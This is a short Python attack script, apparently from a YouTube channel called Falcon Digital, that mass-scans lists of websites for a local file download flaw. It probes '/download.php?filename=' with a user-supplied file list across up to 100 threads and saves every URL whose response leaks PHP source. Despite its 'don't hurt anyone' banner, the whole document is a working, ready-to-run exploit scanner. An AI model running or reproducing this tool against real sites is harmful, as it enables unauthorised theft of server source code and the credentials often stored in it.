# requests
# Write By Falcon Digital
# LOCAL FILE DOWNLOAD
# YOUTUBE/FalconDigitalARAB
import time
import requests
import threading
from queue import  Queue
numberOFthread = int(input("enter Number Of Thread 10-100"))
print("""

     Falcon Digital ..
     YOUTUBE / FALCON DIGITAL in Arabic ... 
     Local File Download ..
     Learn Skills Don't Hurt Anyone .. 

""")

list_url = open("list_url.txt",'r').read().splitlines()
list_url_download = open("list_url_download.txt",'r').read().splitlines()


print_lock = threading.Lock()



def attack(q):


    try:
        url = q

        r = requests.get(url,timeout=3).text

        if r.find("404") >=0:
            with print_lock:
                print("[-] BAD URL "+ url)


        elif r.find("<?php") >=0:
            with print_lock:
                print("[+] FOUND URL LFD "+ url)
                with open('save.txt','a') as w:

                    w.write(url+"\n")



    except Exception as e:
        pass
save_list = []

q = Queue()

start = time.time()


thread_list = []
def threading1():
    while True:
        worker = str(q.get())

        attack(worker)
        q.task_done()
for x in range(numberOFthread):
    t = threading.Thread(target=threading1)
    t.daemon = True
    t.start()
    thread_list.append(t)

for m in list_url:
    for i in list_url_download:
        url = m + "/download.php?filename=" + i

        if url.find('http') >= 0:
            q.put(url)
        else:
            pass
q.join()
end = time.time()
print('time taken: {:.4f}'.format(end - start))
